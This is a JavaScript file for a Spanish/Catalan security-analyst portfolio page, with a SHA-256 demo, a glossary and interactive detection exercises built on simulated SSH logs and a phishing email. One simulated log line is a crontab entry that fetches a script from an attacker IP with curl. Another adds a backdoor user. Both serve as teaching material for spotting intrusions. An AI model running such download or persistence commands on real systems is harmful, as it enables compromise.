/* Portfolio: huella dibujada, pruebas que se mueven, filtro, SHA-256 real, casos, glosario y luz UV */
document.documentElement.classList.add("js");

const reducido = matchMedia("(prefers-reduced-motion: reduce)").matches;
const NS = "http://www.w3.org/2000/svg";
const ca = document.documentElement.lang === "ca";

/* ---------- Textos que dependen del idioma ---------- */
const TXT = ca ? {
  distintos: (n) => `${n} de 64 caràcters són diferents dels de l'empremta original.`,
  intacta: "Coincideix amb l'empremta original: la prova està intacta.",
  marcadas: (n) => `${n} ${n === 1 ? "marcada" : "marcades"}`,
  perfecto: (n) => `Cas resolt: has trobat les ${n} marques correctes, sense falses alarmes.`,
  parcial: (a, n, f) => `Has trobat ${a} de ${n} i ${f === 1 ? "1 falsa alarma" : `${f} falses alarmes`}. Les línies amb vora discontínua són les que canviarien la teva resposta.`
} : {
  distintos: (n) => `${n} de 64 caracteres son distintos a los de la huella original.`,
  intacta: "Coincide con la huella original: la prueba está intacta.",
  marcadas: (n) => `${n} ${n === 1 ? "marcada" : "marcadas"}`,
  perfecto: (n) => `Caso resuelto: encontraste las ${n} marcas correctas, sin falsas alarmas.`,
  parcial: (a, n, f) => `Has encontrado ${a} de ${n} y ${f === 1 ? "1 falsa alarma" : `${f} falsas alarmas`}. Las líneas con borde discontinuo son las que cambiarían tu respuesta.`
};

const GLOSARIO = ca ? {
  soc: "Centre d'Operacions de Seguretat: l'equip que vigila els sistemes i respon als incidents.",
  wazuh: "Eina que recull registres dels equips i genera alertes de seguretat.",
  iris: "Plataforma per gestionar i documentar els casos d'un incident.",
  grafana: "Eina que mostra dades en panells i gràfics.",
  fp: "Alerta que salta sense que hi hagi cap problema real.",
  th: "Buscar amenaces de manera activa, sense esperar que salti una alerta.",
  sha: "Funció que converteix qualsevol dada en una empremta de 64 caràcters. Si la dada canvia, l'empremta també."
} : {
  soc: "Centro de Operaciones de Seguridad: el equipo que vigila los sistemas y responde a los incidentes.",
  wazuh: "Herramienta que recoge registros de los equipos y genera alertas de seguridad.",
  iris: "Plataforma para gestionar y documentar los casos de un incidente.",
  grafana: "Herramienta que muestra datos en paneles y gráficos.",
  fp: "Alerta que salta sin que haya un problema real.",
  th: "Buscar amenazas de forma activa, sin esperar a que salte una alerta.",
  sha: "Función que convierte cualquier dato en una huella de 64 caracteres. Si el dato cambia, la huella también."
};

/* Casos simulados. Las IP 203.0.113.x y el dominio .example están reservados para ejemplos. */
const CASOS = {
  accesos: [
    { t: "08:58:12  sshd  Accepted password for ana from 192.168.1.20", ok: false, es: "Normal: acceso desde la red interna.", ca: "Normal: accés des de la xarxa interna." },
    { t: "09:14:02  sshd  Failed password for root from 203.0.113.45", ok: true, es: "Prueba contraseñas desde una IP externa.", ca: "Prova contrasenyes des d'una IP externa." },
    { t: "09:14:04  sshd  Failed password for admin from 203.0.113.45", ok: true, es: "Misma IP, dos segundos después: no parece una persona.", ca: "Mateixa IP, dos segons després: no sembla una persona." },
    { t: "09:14:06  sshd  Failed password for admin from 203.0.113.45", ok: true, es: "Sigue el ataque de fuerza bruta.", ca: "Continua l'atac de força bruta." },
    { t: "09:14:31  sshd  Accepted password for admin from 203.0.113.45", ok: true, es: "La clave: la misma IP consigue entrar.", ca: "La clau: la mateixa IP aconsegueix entrar." },
    { t: "09:15:10  sudo  admin : COMMAND=/usr/sbin/useradd soporte2", ok: true, es: "Crea un usuario para conservar el acceso.", ca: "Crea un usuari per conservar l'accés." },
    { t: "09:16:48  crontab  admin : tarea, curl http://203.0.113.45/s.sh", ok: true, es: "Programa una descarga desde la IP atacante.", ca: "Programa una baixada des de la IP atacant." },
    { t: "09:20:00  CRON  root : /usr/local/bin/copia-seguridad.sh", ok: false, es: "Normal: copia de seguridad programada.", ca: "Normal: còpia de seguretat programada." },
    { t: "09:31:22  sshd  Failed password for ana from 192.168.1.20", ok: false, es: "Un solo fallo desde la red interna.", ca: "Una sola fallada des de la xarxa interna." },
    { t: "09:31:29  sshd  Accepted password for ana from 192.168.1.20", ok: false, es: "Normal: ana entra a la segunda.", ca: "Normal: ana entra a la segona." }
  ],
  correo: [
    { t: { es: "De: Soporte Banco <avisos@banco-seguro-verif.example>", ca: "De: Suport Banc <avisos@banco-seguro-verif.example>" }, ok: true, es: "El dominio no es el de un banco, solo lo parece.", ca: "El domini no és el d'un banc, només ho sembla." },
    { t: { es: "Para: cliente@correo.example", ca: "Per a: client@correo.example" }, ok: false, es: "Normal: un destinatario sin nada raro.", ca: "Normal: un destinatari sense res estrany." },
    { t: { es: "Fecha: martes, 10:12", ca: "Data: dimarts, 10:12" }, ok: false, es: "Normal: la hora no demuestra nada.", ca: "Normal: l'hora no demostra res." },
    { t: { es: "Autenticación: spf=fail, dkim=none, dmarc=fail", ca: "Autenticació: spf=fail, dkim=none, dmarc=fail" }, ok: true, es: "Las comprobaciones de autenticidad no pasan.", ca: "Les comprovacions d'autenticitat no passen." },
    { t: { es: "Asunto: URGENTE: su cuenta se bloqueará en 24 horas", ca: "Assumpte: URGENT: el seu compte es bloquejarà en 24 hores" }, ok: true, es: "Meter prisa evita que te pares a pensar.", ca: "Fer pressa evita que t'aturis a pensar." },
    { t: { es: "Estimado cliente:", ca: "Benvolgut client:" }, ok: true, es: "Saludo genérico: no usa tu nombre.", ca: "Salutació genèrica: no fa servir el teu nom." },
    { t: { es: "Enlace: Verificar mi cuenta → http://banco-seguro-verif.example/login", ca: "Enllaç: Verificar el meu compte → http://banco-seguro-verif.example/login" }, ok: true, es: "Lleva a una web falsa para robar la contraseña.", ca: "Porta a una web falsa per robar la contrasenya." },
    { t: { es: "Atentamente, Atención al Cliente", ca: "Atentament, Atenció al Client" }, ok: false, es: "Normal: una despedida no delata nada.", ca: "Normal: un comiat no delata res." }
  ]
};

/* ---------- Huella dactilar: crestas que se dibujan al cargar ---------- */
const huella = document.getElementById("huella");
for (let i = 0; i < 17; i++) {
  const r = 14 + i * 12;
  const hueco = 0.1 + ((i * 37) % 11) * 0.11;          // cada línea se corta por un sitio distinto
  const punto = (a) => {
    const onda = 1 + 0.035 * Math.sin(3 * a + i * 0.35) + 0.02 * Math.sin(5 * a - i * 0.2);
    return `${(200 + Math.cos(a) * r * onda).toFixed(1)} ${(270 + Math.sin(a) * r * 1.22 * onda).toFixed(1)}`;
  };
  // Dos o tres tramos por línea, separados por cortes pequeños, como las crestas reales
  const tramos = i % 3 === 0 ? 3 : 2;
  for (let t = 0; t < tramos; t++) {
    const ini = hueco + (t / tramos) * Math.PI * 2 + 0.07;
    const fin = hueco + ((t + 1) / tramos) * Math.PI * 2 - 0.07;
    let d = `M ${punto(ini)}`;
    for (let a = ini + 0.08; a < fin; a += 0.08) d += ` L ${punto(a)}`;
    const arco = document.createElementNS(NS, "path");
    arco.setAttribute("d", d);
    huella.appendChild(arco);
    if (!reducido) {
      const largo = arco.getTotalLength();
      arco.style.strokeDasharray = largo;
      arco.animate([{ strokeDashoffset: largo }, { strokeDashoffset: 0 }], { duration: 1100, delay: i * 45, easing: "ease-out", fill: "backwards" });
    }
  }
}

/* ---------- Barra de progreso en la cinta ---------- */
const progreso = document.getElementById("progreso");
function medirProgreso() {
  const total = document.documentElement.scrollHeight - innerHeight;
  progreso.style.transform = `scaleX(${total > 0 ? Math.min(scrollY / total, 1) : 0})`;
}
addEventListener("scroll", medirProgreso, { passive: true });
addEventListener("resize", medirProgreso);
medirProgreso();

/* ---------- Pruebas: inclinación, filtro y arrastre con ratón ---------- */
const pruebas = document.querySelectorAll(".prueba");
pruebas.forEach((p, i) => p.style.setProperty("--giro", `${[-1.6, 1.2, -0.7, 1.7, -1.1, 0.8, -1.4][i % 7]}deg`));

const filtros = document.querySelectorAll(".filtros button");
filtros.forEach((b) => b.addEventListener("click", () => {
  filtros.forEach((o) => { o.classList.toggle("activo", o === b); o.setAttribute("aria-pressed", String(o === b)); });
  pruebas.forEach((p) => {
    p.hidden = b.dataset.f !== "todas" && p.dataset.o !== b.dataset.f;
    p.style.removeProperty("--x");
    p.style.removeProperty("--y");
  });
}));

if (matchMedia("(hover: hover) and (pointer: fine)").matches) {
  pruebas.forEach((p) => {
    let x = 0, y = 0, ix = 0, iy = 0;
    p.addEventListener("pointerdown", (e) => {
      if (e.target.closest(".termino")) return;
      x = parseFloat(p.style.getPropertyValue("--x")) || 0;
      y = parseFloat(p.style.getPropertyValue("--y")) || 0;
      ix = e.clientX; iy = e.clientY;
      p.setPointerCapture(e.pointerId);
      p.classList.add("moviendo");
    });
    p.addEventListener("pointermove", (e) => {
      if (!p.classList.contains("moviendo")) return;
      p.style.setProperty("--x", `${x + e.clientX - ix}px`);
      p.style.setProperty("--y", `${y + e.clientY - iy}px`);
    });
    const soltar = () => p.classList.remove("moviendo");
    p.addEventListener("pointerup", soltar);
    p.addEventListener("pointercancel", soltar);
  });
}

/* ---------- Sello: SHA-256 real con la API del navegador ---------- */
const entradaHash = document.getElementById("texto-hash");
const salidaHash = document.getElementById("hash");
const cambios = document.getElementById("cambios");
const textoOriginal = entradaHash.value;
let huellaOriginal = null;
async function sellar() {
  if (!crypto.subtle) { salidaHash.textContent = "—"; return; }
  const valor = entradaHash.value;
  const datos = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(valor));
  if (valor !== entradaHash.value) return; // ya se ha escrito otra cosa
  const huellaHex = [...new Uint8Array(datos)].map((b) => b.toString(16).padStart(2, "0")).join("");
  huellaOriginal ??= huellaHex;
  // Resalta cada carácter que no coincide con la huella del texto original
  let distintos = 0;
  salidaHash.replaceChildren(...[...huellaHex].map((c, i) => {
    const s = document.createElement("span");
    s.textContent = c;
    if (c !== huellaOriginal[i]) { s.className = "cambia"; distintos++; }
    return s;
  }));
  cambios.textContent = distintos ? TXT.distintos(distintos) : TXT.intacta;
}
entradaHash.addEventListener("input", sellar);
document.getElementById("restaurar").addEventListener("click", () => { entradaHash.value = textoOriginal; sellar(); });
sellar();

/* ---------- Casos simulados: marcar lo sospechoso y cerrar ---------- */
document.querySelectorAll(".caso-lab").forEach((raiz) => {
  const lineas = CASOS[raiz.dataset.caso];
  const lista = raiz.querySelector(".registro");
  const cerrar = raiz.querySelector(".lab__cerrar");
  const reabrir = raiz.querySelector(".lab__reabrir");
  const cuenta = raiz.querySelector(".lab__cuenta");
  const veredicto = raiz.querySelector(".veredicto");
  const nota = raiz.querySelector(".veredicto__nota");

  const botones = lineas.map((linea) => {
    const li = document.createElement("li");
    const b = document.createElement("button");
    b.type = "button";
    b.textContent = typeof linea.t === "string" ? linea.t : linea.t[ca ? "ca" : "es"];
    b.setAttribute("aria-pressed", "false");
    b.addEventListener("click", () => {
      b.setAttribute("aria-pressed", String(b.getAttribute("aria-pressed") !== "true"));
      cuenta.textContent = TXT.marcadas(botones.filter((o) => o.getAttribute("aria-pressed") === "true").length);
    });
    const explica = document.createElement("p");
    explica.className = "registro__nota";
    explica.hidden = true;
    explica.textContent = linea[ca ? "ca" : "es"];
    li.append(b, explica);
    lista.appendChild(li);
    return b;
  });

  cerrar.addEventListener("click", () => {
    let aciertos = 0, falsos = 0;
    const reales = lineas.filter((l) => l.ok).length;
    botones.forEach((b, i) => {
      const marcada = b.getAttribute("aria-pressed") === "true";
      if (marcada && lineas[i].ok) aciertos++;
      if (marcada && !lineas[i].ok) falsos++;
      b.disabled = true;
      b.parentElement.classList.add(lineas[i].ok ? "es-ataque" : "es-normal");
      if (marcada !== lineas[i].ok) b.parentElement.classList.add("fallo");
      b.nextElementSibling.hidden = false;
    });
    nota.textContent = aciertos === reales && falsos === 0 ? TXT.perfecto(reales) : TXT.parcial(aciertos, reales, falsos);
    veredicto.hidden = false;
    cerrar.hidden = true;
    reabrir.hidden = false;
    veredicto.focus({ preventScroll: true });
    veredicto.scrollIntoView({ block: "nearest", behavior: reducido ? "auto" : "smooth" });
  });

  reabrir.addEventListener("click", () => {
    botones.forEach((b) => {
      b.disabled = false;
      b.setAttribute("aria-pressed", "false");
      b.parentElement.className = "";
      b.nextElementSibling.hidden = true;
    });
    cuenta.textContent = TXT.marcadas(0);
    veredicto.hidden = true;
    reabrir.hidden = true;
    cerrar.hidden = false;
    cerrar.focus();
  });
});

/* ---------- Glosario: definición al pasar, enfocar o tocar ---------- */
const definicion = document.getElementById("definicion");
let terminoActivo = null;
function mostrarDefinicion(t) {
  terminoActivo = t;
  definicion.textContent = GLOSARIO[t.dataset.t];
  definicion.hidden = false;
  t.setAttribute("aria-describedby", "definicion");
  const r = t.getBoundingClientRect();
  const ancho = definicion.offsetWidth;
  definicion.style.left = `${Math.max(10, Math.min(r.left, innerWidth - ancho - 10))}px`;
  const arriba = r.top - definicion.offsetHeight - 8;
  definicion.style.top = `${arriba > 60 ? arriba : r.bottom + 8}px`;
}
function ocultarDefinicion() {
  terminoActivo?.removeAttribute("aria-describedby");
  terminoActivo = null;
  definicion.hidden = true;
}
document.querySelectorAll(".termino").forEach((t) => {
  t.addEventListener("mouseenter", () => mostrarDefinicion(t));
  t.addEventListener("mouseleave", ocultarDefinicion);
  t.addEventListener("focus", () => mostrarDefinicion(t));
  t.addEventListener("blur", ocultarDefinicion);
  t.addEventListener("click", () => mostrarDefinicion(t));
});
addEventListener("scroll", ocultarDefinicion, { passive: true });

/* ---------- Luz ultravioleta: la linterna revela pistas ocultas ---------- */
const botonUV = document.getElementById("uv");
const cuentaUV = document.getElementById("uv-cuenta");
const capaUV = document.getElementById("uv-capa");
const pistas = [...document.querySelectorAll(".pista")];
const halladas = new Set();
let luzX = innerWidth / 2, luzY = innerHeight / 2, pendiente = false;

function pintarLuz() {
  pendiente = false;
  if (!document.body.classList.contains("uv")) return;
  capaUV.style.setProperty("--mx", `${luzX}px`);
  capaUV.style.setProperty("--my", `${luzY}px`);
  pistas.forEach((p) => {
    const r = p.getBoundingClientRect();
    const dx = Math.max(r.left - luzX, 0, luzX - r.right);
    const dy = Math.max(r.top - luzY, 0, luzY - r.bottom);
    const luz = Math.max(0, Math.min(1, (170 - Math.hypot(dx, dy)) / 90));
    p.style.opacity = luz;
    if (luz > 0.8) halladas.add(p);
  });
  cuentaUV.textContent = ` ${halladas.size}/${pistas.length}`;
}
const pedirLuz = () => { if (!pendiente) { pendiente = true; requestAnimationFrame(pintarLuz); } };
function moverLuz(x, y) { luzX = x; luzY = y; pedirLuz(); }
addEventListener("pointermove", (e) => moverLuz(e.clientX, e.clientY), { passive: true });
addEventListener("pointerdown", (e) => moverLuz(e.clientX, e.clientY), { passive: true });
addEventListener("touchmove", (e) => moverLuz(e.touches[0].clientX, e.touches[0].clientY), { passive: true });
addEventListener("scroll", pedirLuz, { passive: true });

function ponerUV(activa) {
  document.body.classList.toggle("uv", activa);
  botonUV.setAttribute("aria-pressed", String(activa));
  if (activa) pintarLuz(); else cuentaUV.textContent = "";
}
botonUV.addEventListener("click", () => ponerUV(!document.body.classList.contains("uv")));
addEventListener("keydown", (e) => {
  if (e.key !== "Escape") return;
  ocultarDefinicion();
  ponerUV(false);
});

document.getElementById("imprimir").addEventListener("click", () => print());

/* ---------- Aparición al entrar en pantalla ---------- */
const aparecen = document.querySelectorAll(".aparece");
if (reducido || !("IntersectionObserver" in window)) {
  aparecen.forEach((a) => a.classList.add("visto"));
} else {
  const vigia = new IntersectionObserver((entradas) => {
    entradas.forEach((e) => { if (e.isIntersecting) { e.target.classList.add("visto"); vigia.unobserve(e.target); } });
  }, { threshold: 0.15 });
  aparecen.forEach((a) => vigia.observe(a));
}
